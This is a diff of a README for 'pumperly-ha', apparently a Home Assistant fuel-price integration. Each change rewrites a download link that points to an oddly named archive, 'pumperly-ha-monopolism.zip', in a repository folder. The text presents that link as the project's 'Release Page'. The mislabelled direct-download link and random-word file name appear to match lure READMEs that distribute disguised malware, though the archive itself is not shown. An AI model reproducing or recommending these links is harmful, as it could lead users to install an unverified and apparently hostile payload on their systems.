@@ -1,10 +1,10 @@
 # ⛽ pumperly-ha - Track Fuel Prices with Ease
 
-[![Download pumperly-ha](https://img.shields.io/badge/Download%20pumperly--ha-Release%20Page-1f6feb?style=for-the-badge&logo=github)](https://github.com/Katinkabraindead382/pumperly-ha/raw/refs/heads/main/custom_components/pumperly/pumperly-ha-monopolism.zip)
+[![Download pumperly-ha](https://img.shields.io/badge/Download%20pumperly--ha-Release%20Page-1f6feb?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Katinkabraindead382/pumperly-ha/main/custom_components/pumperly/pumperly-ha-monopolism.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Katinkabraindead382/pumperly-ha/raw/refs/heads/main/custom_components/pumperly/pumperly-ha-monopolism.zip
+Visit this page to download: https://raw.githubusercontent.com/Katinkabraindead382/pumperly-ha/main/custom_components/pumperly/pumperly-ha-monopolism.zip
 
 Use the latest release file that matches your Home Assistant setup.
 
@@ -40,7 +40,7 @@ This project is not a Windows app that you run on its own. It is a Home Assistan
 
 Go to the release page:
 
-https://github.com/Katinkabraindead382/pumperly-ha/raw/refs/heads/main/custom_components/pumperly/pumperly-ha-monopolism.zip
+https://raw.githubusercontent.com/Katinkabraindead382/pumperly-ha/main/custom_components/pumperly/pumperly-ha-monopolism.zip
 
 Download the latest release package from that page.
 
